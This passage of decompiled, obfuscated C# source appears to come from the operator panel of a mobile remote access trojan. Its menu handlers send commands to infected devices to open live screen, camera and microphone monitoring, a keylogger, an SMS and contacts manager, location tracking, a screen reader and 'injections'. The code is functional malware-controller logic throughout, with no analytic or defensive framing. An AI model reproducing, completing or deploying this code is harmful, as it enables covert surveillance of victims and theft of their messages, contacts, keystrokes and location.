		}
	}

	public void ToolStripMenuItem2_Click(object sender, EventArgs e)
	{
		if (DGV0.SelectedRows.Count <= 0)
		{
			return;
		}
		foreach (DataGridViewRow selectedRow in DGV0.SelectedRows)
		{
			try
			{
				if (selectedRow.Tag == null)
				{
					continue;
				}
				BTClient bTClient = (BTClient)selectedRow.Cells[0].Tag;
				if (bTClient.mobid != null)
				{
					string name = EXGuarder._61374657 + bTClient.mobid;
					profile profile2 = (profile)MyProject.Application.OpenForms[name];
					if (profile2 == null)
					{
						profile2 = new profile();
						profile2.Name = name;
						profile2.Btcli = bTClient;
						profile2.mainform = this;
						profile2.Show();
					}
					else
					{
						profile2.BringToFront();
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	public void ToolStripMenuItem4_Click(object sender, EventArgs e)
	{
		if (DGV0.SelectedRows.Count <= 0)
		{
			return;
		}
		foreach (DataGridViewRow selectedRow in DGV0.SelectedRows)
		{
			try
			{
				if (selectedRow.Tag == null)
				{
					continue;
				}
				BTClient bTClient = (BTClient)selectedRow.Cells[0].Tag;
				if (bTClient.mobid != null)
				{
					string name = EXGuarder._2E406C1E + bTClient.mobid;
					ScreenMonitor screenMonitor = (ScreenMonitor)MyProject.Application.OpenForms[name];
					if (screenMonitor == null)
					{
						screenMonitor = new ScreenMonitor();
						screenMonitor.Name = name;
						screenMonitor.Btcli = bTClient;
						screenMonitor.Show();
					}
					else
					{
						screenMonitor.BringToFront();
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	public void ToolStripMenuItem5_Click(object sender, EventArgs e)
	{
		if (DGV0.SelectedRows.Count <= 0)
		{
			return;
		}
		foreach (DataGridViewRow selectedRow in DGV0.SelectedRows)
		{
			try
			{
				if (selectedRow.Tag == null)
				{
					continue;
				}
				BTClient bTClient = (BTClient)selectedRow.Cells[0].Tag;
				if (bTClient.mobid != null)
				{
					string name = EXGuarder._5C696A1B + bTClient.mobid;
					CameraMonitor cameraMonitor = (CameraMonitor)MyProject.Application.OpenForms[name];
					if (cameraMonitor == null)
					{
						VB_0024AnonymousType_5<string> data = new VB_0024AnonymousType_5<string>(EXGuarder._114F4E68);
						string value = BTCommand.FormatCommand(EXGuarder._4E111940, data);
						Dictionary<string, object> dictionary = new Dictionary<string, object>();
						dictionary.Add(EXGuarder._416B3B02, BTConst.wrk);
						dictionary.Add(EXGuarder._4C3A5E79, value);
						Dictionary<string, object> chatData = dictionary;
						BTEngine.commands(chatData, bTClient.mobid, bTClient.Serverins.WSClient);
					}
					else
					{
						cameraMonitor.BringToFront();
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	public void ToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		if (DGV0.SelectedRows.Count <= 0)
		{
			return;
		}
		foreach (DataGridViewRow selectedRow in DGV0.SelectedRows)
		{
			try
			{
				if (selectedRow.Tag == null)
				{
					continue;
				}
				BTClient bTClient = (BTClient)selectedRow.Cells[0].Tag;
				if (bTClient.mobid != null)
				{
					string name = EXGuarder._32552A33 + bTClient.mobid;
					MicMonitor micMonitor = (MicMonitor)MyProject.Application.OpenForms[name];
					if (micMonitor == null)
					{
						micMonitor = new MicMonitor();
						micMonitor.Name = name;
						micMonitor.Btcli = bTClient;
						micMonitor.Show();
					}
					else
					{
						micMonitor.BringToFront();
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	public void ToolStripMenuItem7_Click(object sender, EventArgs e)
	{
		if (DGV0.SelectedRows.Count <= 0)
		{
			return;
		}
		foreach (DataGridViewRow selectedRow in DGV0.SelectedRows)
		{
			try
			{
				if (selectedRow.Tag == null)
				{
					continue;
				}
				BTClient bTClient = (BTClient)selectedRow.Cells[0].Tag;
				if (bTClient.mobid != null)
				{
					string name = EXGuarder._0E74082F + bTClient.mobid;
					SmsManager smsManager = (SmsManager)MyProject.Application.OpenForms[name];
					if (smsManager == null)
					{
						VB_0024AnonymousType_11<string, string> data = new VB_0024AnonymousType_11<string, string>(EXGuarder._38380906, EXGuarder._1D230A5A);
						string value = BTCommand.FormatCommand(EXGuarder._691E2462, data);
						Dictionary<string, object> dictionary = new Dictionary<string, object>();
						dictionary.Add(EXGuarder._774E1411, BTConst.wrk);
						dictionary.Add(EXGuarder._03792152, value);
						Dictionary<string, object> chatData = dictionary;
						BTEngine.commands(chatData, bTClient.mobid, bTClient.Serverins.WSClient);
					}
					else
					{
						smsManager.BringToFront();
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	public void ToolStripMenuItem8_Click(object sender, EventArgs e)
	{
		if (DGV0.SelectedRows.Count <= 0)
		{
			return;
		}
		foreach (DataGridViewRow selectedRow in DGV0.SelectedRows)
		{
			try
			{
				if (selectedRow.Tag == null)
				{
					continue;
				}
				BTClient bTClient = (BTClient)selectedRow.Cells[0].Tag;
				if (bTClient.mobid != null)
				{
					string name = EXGuarder._751D052B + bTClient.mobid;
					ContactsManager contactsManager = (ContactsManager)MyProject.Application.OpenForms[name];
					if (contactsManager == null)
					{
						VB_0024AnonymousType_5<string> data = new VB_0024AnonymousType_5<string>(EXGuarder._6343405F);
						string value = BTCommand.FormatCommand(EXGuarder._1C485B72, data);
						Dictionary<string, object> dictionary = new Dictionary<string, object>();
						dictionary.Add(EXGuarder._554F1035, BTConst.wrk);
						dictionary.Add(EXGuarder._4D2A1B30, value);
						Dictionary<string, object> chatData = dictionary;
						BTEngine.commands(chatData, bTClient.mobid, bTClient.Serverins.WSClient);
					}
					else
					{
						contactsManager.BringToFront();
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	public void ToolStripMenuItem9_Click(object sender, EventArgs e)
	{
		if (DGV0.SelectedRows.Count <= 0)
		{
			return;
		}
		foreach (DataGridViewRow selectedRow in DGV0.SelectedRows)
		{
			try
			{
				if (selectedRow.Tag == null)
				{
					continue;
				}
				BTClient bTClient = (BTClient)selectedRow.Cells[0].Tag;
				if (bTClient.mobid != null)
				{
					string name = EXGuarder._023F6D5E + bTClient.mobid;
					ContactsManager contactsManager = (ContactsManager)MyProject.Application.OpenForms[name];
					if (contactsManager == null)
					{
						VB_0024AnonymousType_5<string> data = new VB_0024AnonymousType_5<string>(EXGuarder._18041D6B);
						string value = BTCommand.FormatCommand(EXGuarder._306C085F, data);
						Dictionary<string, object> dictionary = new Dictionary<string, object>();
						dictionary.Add(EXGuarder._4F6E460F, BTConst.wrk);
						dictionary.Add(EXGuarder._4D59740D, value);
						Dictionary<string, object> chatData = dictionary;
						BTEngine.commands(chatData, bTClient.mobid, bTClient.Serverins.WSClient);
						dictionary = new Dictionary<string, object>();
						dictionary.Add(EXGuarder._4F6E460F, EXGuarder._08015A2C);
						dictionary.Add(EXGuarder._6944191E, EXGuarder._18041D6B);
						Dictionary<string, object> chatData2 = dictionary;
						BTEngine.commands(chatData2, bTClient.mobid, bTClient.Serverins.WSClient);
					}
					else
					{
						contactsManager.BringToFront();
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	public void ToolStripMenuItem14_Click(object sender, EventArgs e)
	{
		if (DGV0.SelectedRows.Count <= 0)
		{
			return;
		}
		foreach (DataGridViewRow selectedRow in DGV0.SelectedRows)
		{
			try
			{
				if (selectedRow.Tag == null)
				{
					continue;
				}
				BTClient bTClient = (BTClient)selectedRow.Cells[0].Tag;
				if (bTClient.mobid != null)
				{
					string name = EXGuarder._45566625 + bTClient.mobid;
					LiveKeylogger liveKeylogger = (LiveKeylogger)MyProject.Application.OpenForms[name];
					if (liveKeylogger == null)
					{
						VB_0024AnonymousType_9<string, string> data = new VB_0024AnonymousType_9<string, string>(EXGuarder._790E4660, EXGuarder._4702325D);
						string value = BTCommand.FormatCommand(EXGuarder._442A4637, data);
						Dictionary<string, object> dictionary = new Dictionary<string, object>();
						dictionary.Add(EXGuarder._3A287666, BTConst.wrk);
						dictionary.Add(EXGuarder._1776484A, value);
						Dictionary<string, object> chatData = dictionary;
						BTEngine.commands(chatData, bTClient.mobid, bTClient.Serverins.WSClient);
					}
					else
					{
						liveKeylogger.BringToFront();
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	public void JumpToClient(string mobid)
	{
		try
		{
			if (!string.IsNullOrWhiteSpace(mobid))
			{
				BTClient clientById = BTEngine.GetClientById(mobid);
				if (clientById != null && clientById.row != null)
				{
					DGV0.FirstDisplayedScrollingRowIndex = clientById.row.Index;
				}
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}

	public void Blockclient_Click(object sender, EventArgs e, string targetid = "")
	{
		if (DGV0.SelectedRows.Count <= 0 || (!BTRegistry.ReadBool(EXGuarder._75370274) && MyMsg.Show(EXGuarder._613D3378, string.Format(EXGuarder._5B4A7458, EXGuarder._460F662E), MyMsg.msgtype.Confirm, use_no: true, showskip: true, EXGuarder._75370274) != DialogResult.OK))
		{
			return;
		}
		foreach (DataGridViewRow selectedRow in DGV0.SelectedRows)
		{
			try
			{
				if (selectedRow.Tag == null)
				{
					continue;
				}
				BTClient bTClient = (BTClient)selectedRow.Cells[0].Tag;
				if (bTClient.mobid != null && (Operators.CompareString(targetid, EXGuarder._5C625A1E, TextCompare: false) == 0 || Operators.CompareString(bTClient.mobid, targetid, TextCompare: false) == 0))
				{
					if (!BTEngine.BlockedClients.Contains(bTClient.mobid))
					{
						LogConnection(BTConst.Blockedstr, codes.connectionicon(EXGuarder._3911634A), bTClient.address, BTConst.blockidstr, bTClient.Serverins);
						BTEngine.BlockedClients.Add(bTClient.mobid);
					}
					if (!BTEngine.BlockedClients.Contains(bTClient.address))
					{
						LogConnection(BTConst.Blockedstr, codes.connectionicon(EXGuarder._3911634A), bTClient.address, BTConst.blockipstr, bTClient.Serverins);
						BTEngine.BlockedClients.Add(bTClient.address);
					}
					bTClient.iamout();
					string javaScript = EXGuarder._74214942 + string.Format(EXGuarder._46136D53, codes.BitmapToBase64(bTClient.wallpaper)) + string.Format(EXGuarder._46136D53, bTClient.name.Replace(EXGuarder._64057541, EXGuarder._40110231)) + string.Format(EXGuarder._46136D53, bTClient.address.Replace(EXGuarder._64057541, EXGuarder._40110231)) + string.Format(EXGuarder._46136D53, bTClient.country.Replace(EXGuarder._64057541, EXGuarder._40110231)) + string.Format(EXGuarder._46136D53, bTClient.Serverins.Sname.Replace(EXGuarder._64057541, EXGuarder._40110231)) + string.Format(EXGuarder._46136D53, bTClient.Serverins.Scolor) + EXGuarder._4813783F + string.Format(EXGuarder._46136D53, bTClient.Serverins.Address) + string.Format(EXGuarder._560E6B37, bTClient.mobid.Replace(EXGuarder._64057541, EXGuarder._40110231)) + EXGuarder._5F661A19;
					blockview.CoreWebView2.ExecuteScriptAsync(javaScript);
					BTAlerter.Success(string.Format(EXGuarder._4E2C3266, bTClient.name, BTConst.blkscesstr));
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	private void ToolStripMenuItem13_Click(object sender, EventArgs e)
	{
		if (DGV0.SelectedRows.Count <= 0)
		{
			return;
		}
		foreach (DataGridViewRow selectedRow in DGV0.SelectedRows)
		{
			try
			{
				if (selectedRow.Tag != null)
				{
					BTClient bTClient = (BTClient)selectedRow.Cells[0].Tag;
					if (bTClient.mobid != null)
					{
						VB_0024AnonymousType_5<string> data = new VB_0024AnonymousType_5<string>(EXGuarder._34182C4C);
						string value = BTCommand.FormatCommand(EXGuarder._08143947, data);
						Dictionary<string, object> dictionary = new Dictionary<string, object>();
						dictionary.Add(EXGuarder._75633420, BTConst.wrk);
						dictionary.Add(EXGuarder._1504575C, value);
						Dictionary<string, object> chatData = dictionary;
						BTEngine.commands(chatData, bTClient.mobid, bTClient.Serverins.WSClient);
						bTClient.iamout();
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	private void BlockToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (DGV0.SelectedRows.Count <= 0)
		{
			return;
		}
		foreach (DataGridViewRow selectedRow in DGV0.SelectedRows)
		{
			try
			{
				if (selectedRow.Tag != null)
				{
					BTClient bTClient = (BTClient)selectedRow.Cells[0].Tag;
					VB_0024AnonymousType_5<string> data = new VB_0024AnonymousType_5<string>(EXGuarder._37100C4A);
					string value = BTCommand.FormatCommand(EXGuarder._4C332219, data);
					Dictionary<string, object> dictionary = new Dictionary<string, object>();
					dictionary.Add(EXGuarder._56515645, BTConst.wrk);
					dictionary.Add(EXGuarder._272B711A, value);
					Dictionary<string, object> chatData = dictionary;
					BTEngine.commands(chatData, bTClient.mobid, bTClient.Serverins.WSClient);
					bTClient.iamout();
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	private void ToolStripMenuItem15_Click(object sender, EventArgs e)
	{
	}

	public void ToolStripMenuItem11_Click(object sender, EventArgs e)
	{
		if (DGV0.SelectedRows.Count <= 0)
		{
			return;
		}
		foreach (DataGridViewRow selectedRow in DGV0.SelectedRows)
		{
			try
			{
				if (selectedRow.Tag == null)
				{
					continue;
				}
				BTClient bTClient = (BTClient)selectedRow.Cells[0].Tag;
				if (bTClient.mobid != null)
				{
					string name = EXGuarder._1446755E + bTClient.mobid;
					WebBrowser webBrowser = (WebBrowser)MyProject.Application.OpenForms[name];
					if (webBrowser == null)
					{
						webBrowser = new WebBrowser();
						webBrowser.Name = name;
						webBrowser.Btcli = bTClient;
						webBrowser.Show();
					}
					else
					{
						webBrowser.BringToFront();
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	private void ToolStripMenuItem16_Click(object sender, EventArgs e)
	{
		if (MyMsg.Show(BTConst.reconntopnstr, BTConst.stopappstr, MyMsg.msgtype.Confirm, use_no: true, showskip: false, EXGuarder._570C6D54) != DialogResult.OK || DGV0.SelectedRows.Count <= 0)
		{
			return;
		}
		foreach (DataGridViewRow selectedRow in DGV0.SelectedRows)
		{
			try
			{
				if (selectedRow.Tag != null)
				{
					BTClient bTClient = (BTClient)selectedRow.Cells[0].Tag;
					if (bTClient.mobid != null)
					{
						VB_0024AnonymousType_5<string> data = new VB_0024AnonymousType_5<string>(EXGuarder._5F462649);
						string value = BTCommand.FormatCommand(EXGuarder._7251374D, data);
						Dictionary<string, object> dictionary = new Dictionary<string, object>();
						dictionary.Add(EXGuarder._74306D75, BTConst.wrk);
						dictionary.Add(EXGuarder._693B010F, value);
						Dictionary<string, object> chatData = dictionary;
						BTEngine.commands(chatData, bTClient.mobid, bTClient.Serverins.WSClient);
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	public void insertnotification(BTClient clint, string title, string msg)
	{
		if (base.InvokeRequired)
		{
			Invoke((Action)([SpecialName] () =>
			{
				insertnotification(clint, title, msg);
			}));
			return;
		}
		Bitmap bitmap = new Bitmap(clint.wallpaper);
		string name = clint.name;
		string text = codes.BitmapToBase64(bitmap);
		NotifyVew.CoreWebView2.ExecuteScriptAsync(string.Format(EXGuarder._4436175E, text, name, title, msg, DateTime.Now.ToString(), clint.Serverins.Sname, clint.Serverins.Scolor));
		checked
		{
			unseenNotification++;
			if (BTRegistry.ReadBool(EXGuarder._3C60264B) | clint.isFavorite)
			{
				BTAlerter.custom(title + EXGuarder._4F5A354B + msg, bitmap, Color.FromArgb(40, 40, 40));
			}
		}
	}

	private void ToolStripMenuItem17_Click(object sender, EventArgs e)
	{
	}

	public void BroadCast()
	{
		if (DGV0.Rows.Count <= 0)
		{
			return;
		}
		List<BTClient> list = new List<BTClient>();
		foreach (DataGridViewRow selectedRow in DGV0.SelectedRows)
		{
			try
			{
				if (selectedRow.Tag != null)
				{
					BTClient item = (BTClient)selectedRow.Cells[0].Tag;
					list.Add(item);
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
		if (list.Count <= 0)
		{
			return;
		}
		if (broadcastform == null || broadcastform.IsDisposed)
		{
			broadcastform = new BTBroadcast();
			broadcastform.listclients = list;
			broadcastform.FormClosed += [SpecialName] [DebuggerHidden] (object a0, FormClosedEventArgs a1) =>
			{
				_Lambda_0024__122_002D0();
			};
			broadcastform.Show();
		}
		else
		{
			broadcastform.BringToFront();
			broadcastform.Focus();
		}
	}

	public void ToolStripMenuItem19_Click(object sender, EventArgs e)
	{
		if (DGV0.SelectedRows.Count <= 0)
		{
			return;
		}
		string _1B762A = EXGuarder._1B762A50;
		myinputs myinputs2 = new myinputs();
		myinputs2.msgtitle.Text = EXGuarder._79106A1E;
		myinputs2.inputtext.Text = EXGuarder._1B762A50;
		myinputs2.inputtext.Watermark = EXGuarder._20286317;
		if (myinputs2.ShowDialog() != DialogResult.OK)
		{
			return;
		}
		_1B762A = myinputs2.inputtext.Text;
		if (codes.StrisEmpty(_1B762A))
		{
			_1B762A = EXGuarder._68672376;
		}
		foreach (DataGridViewRow selectedRow in DGV0.SelectedRows)
		{
			try
			{
				if (selectedRow.Tag != null)
				{
					BTClient bTClient = (BTClient)selectedRow.Cells[0].Tag;
					string name = EXGuarder._04121E06 + bTClient.mobid;
					Chat chat = (Chat)MyProject.Application.OpenForms[name];
					if (chat == null)
					{
						chat = new Chat(_1B762A);
						chat.Name = name;
						chat.Btcli = bTClient;
						chat.Show();
					}
					else
					{
						chat.BringToFront();
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	private void ToolStripMenuItem11_Click_1(object sender, EventArgs e)
	{
		if (DGV0.SelectedRows.Count <= 0)
		{
			return;
		}
		foreach (DataGridViewRow selectedRow in DGV0.SelectedRows)
		{
			try
			{
				if (selectedRow.Tag != null)
				{
					BTClient bTClient = (BTClient)selectedRow.Cells[0].Tag;
					string name = EXGuarder._4F042165 + bTClient.mobid;
					Tracker tracker = (Tracker)MyProject.Application.OpenForms[name];
					if (tracker == null)
					{
						tracker = new Tracker();
						tracker.Name = name;
						tracker.Btcli = bTClient;
						Dictionary<string, object> dictionary = new Dictionary<string, object>();
						dictionary.Add(EXGuarder._083A1128, EXGuarder._4C481177);
						dictionary.Add(EXGuarder._455F5D64, EXGuarder._632C7170);
						dictionary.Add(EXGuarder._240C6444, EXGuarder._343D4271);
						dictionary.Add(EXGuarder._76500659, EXGuarder._4026524A);
						dictionary.Add(EXGuarder._6E731237, EXGuarder._03112D59);
						Dictionary<string, object> chatData = dictionary;
						BTEngine.commands(chatData, bTClient.mobid, bTClient.Serverins.WSClient);
						tracker.Show();
					}
					else
					{
						tracker.BringToFront();
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	public void ToolStripMenuItem20_Click(object sender, EventArgs e)
	{
		if (DGV0.SelectedRows.Count <= 0)
		{
			return;
		}
		foreach (DataGridViewRow selectedRow in DGV0.SelectedRows)
		{
			try
			{
				if (selectedRow.Tag != null)
				{
					BTClient bTClient = (BTClient)selectedRow.Cells[0].Tag;
					if (bTClient.mobid != null)
					{
						Dictionary<string, object> dictionary = new Dictionary<string, object>();
						dictionary.Add(EXGuarder._0E143D21, EXGuarder._704C3714);
						dictionary.Add(EXGuarder._3C14273E, EXGuarder._4A51436A);
						Dictionary<string, object> chatData = dictionary;
						BTEngine.commands(chatData, bTClient.mobid, bTClient.Serverins.WSClient);
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	public void ToolStripMenuItem21_Click(object sender, EventArgs e)
	{
		if (DGV0.SelectedRows.Count <= 0)
		{
			return;
		}
		foreach (DataGridViewRow selectedRow in DGV0.SelectedRows)
		{
			try
			{
				if (selectedRow.Tag != null)
				{
					BTClient bTClient = (BTClient)selectedRow.Cells[0].Tag;
					if (bTClient.mobid != null)
					{
						Dictionary<string, object> dictionary = new Dictionary<string, object>();
						dictionary.Add(EXGuarder._63486C12, EXGuarder._1D735966);
						dictionary.Add(EXGuarder._19135422, EXGuarder._466B0B5B);
						Dictionary<string, object> chatData = dictionary;
						BTEngine.commands(chatData, bTClient.mobid, bTClient.Serverins.WSClient);
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	private void StartServerPinger()
	{
		_pingCts = new CancellationTokenSource();
		Task.Run([SpecialName] () => PingServerLoopAsync(_pingCts.Token));
	}

	private void StopServerPinger()
	{
		if (_pingCts != null)
		{
			_pingCts.Cancel();
			_pingCts.Dispose();
			_pingCts = null;
		}
	}

	private async Task PingServerLoopAsync(CancellationToken token)
	{
		while (!token.IsCancellationRequested)
		{
			try
			{
				await Task.Delay(GetPingInterval(), token);
				List<ServersInfo> list = AllServers.ToList();
				foreach (ServersInfo item in list)
				{
					if (token.IsCancellationRequested)
					{
						break;
					}
					if (item.IsOnline)
					{
						await PingOneServerAsync(item, token);
					}
				}
			}
			catch (OperationCanceledException projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				break;
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				Exception ex3 = ex2;
				Debuger.Log_e("PingServerLoop", ex3.Message);
				ProjectData.ClearProjectError();
			}
		}
	}

	private async Task PingOneServerAsync(ServersInfo servr, CancellationToken token)
	{
		try
		{
			int port = 80;
			int timeoutMillis = 3000;
			long num = await Task.Run([SpecialName] () => codes.TcpPing(servr.Address, port, timeoutMillis), token);
			servr.PingMs = num.ToString();
			string serverNextKey = ServersMgr.GetServerNextKey(servr.Address);
			string serverIDF = ServersMgr.GetServerIDF(servr.Address);
			JObject jObject = JObject.Parse(await MyServer.JoinServer(new VB_0024AnonymousType_7<string, string, string, string, string>("join", "1", "0", serverIDF, serverNextKey), servr.MainhttpClient, servr.Address));
			if (jObject["Success"] == null && jObject["Fail"] != null)
			{
				Debuger.Log_e("PING FAIL " + servr.Address, jObject["Fail"].ToString());
			}
		}
		catch (OperationCanceledException projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Exception ex3 = ex2;
			Debuger.Log_e("PingOneServer " + servr.Address, ex3.Message);
			ProjectData.ClearProjectError();
		}
	}

	private int GetPingInterval()
	{
		object value = BTRegistry.GetValue(EXGuarder._60501453, EXGuarder._6D45603B);
		if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._22402E2E, TextCompare: false))
		{
			return 30000;
		}
		if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._6D45603B, TextCompare: false))
		{
			return 15000;
		}
		if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._32607927, TextCompare: false))
		{
			return 10000;
		}
		return 15000;
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		if (!isClosingHandled)
		{
			isClosingHandled = true;
			base.Visible = false;
			e.Cancel = true;
			CleanupAndExit();
		}
	}

	private async void CleanupAndExit()
	{
		try
		{
			StopServerPinger();
			List<ServersInfo> list = AllServers.ToList();
			foreach (ServersInfo item in list)
			{
				item.WSClient.ShouldReconnect = false;
				item.WSClient.OutServer();
				item.IsOnline = false;
				string serverNextKey = ServersMgr.GetServerNextKey(item.Address);
				string serverIDF = ServersMgr.GetServerIDF(item.Address);
				Thread.Sleep(10);
				await MyServer.JoinServer(new VB_0024AnonymousType_7<string, string, string, string, string>("out", "1", "0", serverIDF, serverNextKey), item.MainhttpClient, item.Address);
				try
				{
					item.WSClient.Disconnect("End Main", "0.0.0.0");
					if (item.connectionThread != null && item.connectionThread.IsAlive)
					{
						item.connectionThread.Abort();
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		Alive = false;
		Thread.Sleep(1000);
		Environment.Exit(0);
	}

	private void contimer_Tick(object sender, EventArgs e)
	{
		checked
		{
			try
			{
				long num = 0L;
				long num2 = 0L;
				int num3 = 0;
				List<ServersInfo> list = AllServers.ToList();
				int count = list.Count;
				StringBuilder stringBuilder = new StringBuilder();
				foreach (ServersInfo item in list)
				{
					long val = 0L;
					ServersInfo serversInfo;
					long location = (serversInfo = item).BytesSent;
					long val2 = Interlocked.Read(ref location);
					serversInfo.BytesSent = location;
					long num4 = Math.Max(val, val2);
					long val3 = 0L;
					location = (serversInfo = item).BytesReceived;
					long val4 = Interlocked.Read(ref location);
					serversInfo.BytesReceived = location;
					long num5 = Math.Max(val3, val4);
					num += num4;
					num2 += num5;
					num3 += item.TotalClients;
					stringBuilder.AppendLine(string.Format(EXGuarder._3F22431E, item.Sid, item.BTClientID, item.TotalClients, item.PingMs, item.WSClient.SocketState, item.SflagBase));
				}
				string text = Conversions.ToString(codes.BytesConverter(num).GetValue(0));
				string text2 = Conversions.ToString(codes.BytesConverter(num2).GetValue(0));
				StringBuilder stringBuilder2 = new StringBuilder();
				if (stringBuilder.Length > 0)
				{
					stringBuilder2.AppendLine(stringBuilder.ToString());
				}
				stringBuilder2.AppendLine(string.Format(EXGuarder._0A370642, text, text2));
				stringBuilder2.AppendLine(string.Format(EXGuarder._20553846, GetPreformStr(), BTConst.tele, num3, count));
				stateview.CoreWebView2.ExecuteScriptAsync(stringBuilder2.ToString());
				homeview.ExecuteScriptAsync(string.Format(EXGuarder._6C3C0611, count, num3, text, text2));
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				Debuger.Log_d(EXGuarder._2B144728, ex2.Message);
				ProjectData.ClearProjectError();
			}
		}
	}

	public void ScreenReaderToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (DGV0.SelectedRows.Count <= 0)
		{
			return;
		}
		foreach (DataGridViewRow selectedRow in DGV0.SelectedRows)
		{
			try
			{
				if (selectedRow.Tag == null)
				{
					continue;
				}
				BTClient bTClient = (BTClient)selectedRow.Cells[0].Tag;
				if (bTClient.mobid != null)
				{
					string name = EXGuarder._33152114 + bTClient.mobid;
					ScreenReader screenReader = (ScreenReader)MyProject.Application.OpenForms[name];
					if (screenReader == null)
					{
						screenReader = new ScreenReader();
						screenReader.Name = name;
						screenReader.Btcli = bTClient;
						screenReader.Show();
					}
					else
					{
						screenReader.BringToFront();
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	private void InjectionsToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (DGV0.SelectedRows.Count <= 0)
		{
			return;
		}
		foreach (DataGridViewRow selectedRow in DGV0.SelectedRows)
		{
			try
			{
				if (selectedRow.Tag != null)
				{
					BTClient bTClient = (BTClient)selectedRow.Cells[0].Tag;
					if (bTClient.mobid != null)
					{
						Dictionary<string, object> dictionary = new Dictionary<string, object>();
						dictionary.Add(EXGuarder._30226A6D, EXGuarder._1E70294A);
						dictionary.Add(EXGuarder._1412004E, EXGuarder._0A450C20);
						dictionary.Add(EXGuarder._5D1A446E, EXGuarder._2C34382B);
						Dictionary<string, object> chatData = dictionary;
						BTEngine.commands(chatData, bTClient.mobid, bTClient.Serverins.WSClient);
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	public void openNotes_Click(object sender, EventArgs e, string targetid = "")
	{
		if (DGV0.SelectedRows.Count <= 0)
		{
			return;
		}
		foreach (DataGridViewRow selectedRow in DGV0.SelectedRows)
		{
			try
			{
				if (selectedRow.Tag == null)
				{
					continue;
				}
				BTClient bTClient = (BTClient)selectedRow.Cells[0].Tag;
				if (bTClient.mobid != null && (Operators.CompareString(targetid, EXGuarder._5B124F77, TextCompare: false) == 0 || Operators.CompareString(bTClient.mobid, targetid, TextCompare: false) == 0))
				{
					string name = EXGuarder._5A663155 + bTClient.mobid;
					btNotes btNotes2 = (btNotes)MyProject.Application.OpenForms[name];
					if (btNotes2 == null)
					{
						btNotes2 = new btNotes();
						btNotes2.Tclient = bTClient;
						btNotes2.Show();
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	public void RenamClient_Click(object sender, EventArgs e, string targetid = "")
	{
		if (DGV0.SelectedRows.Count <= 0)
		{
			return;
		}
		string _16652E = EXGuarder._16652E04;
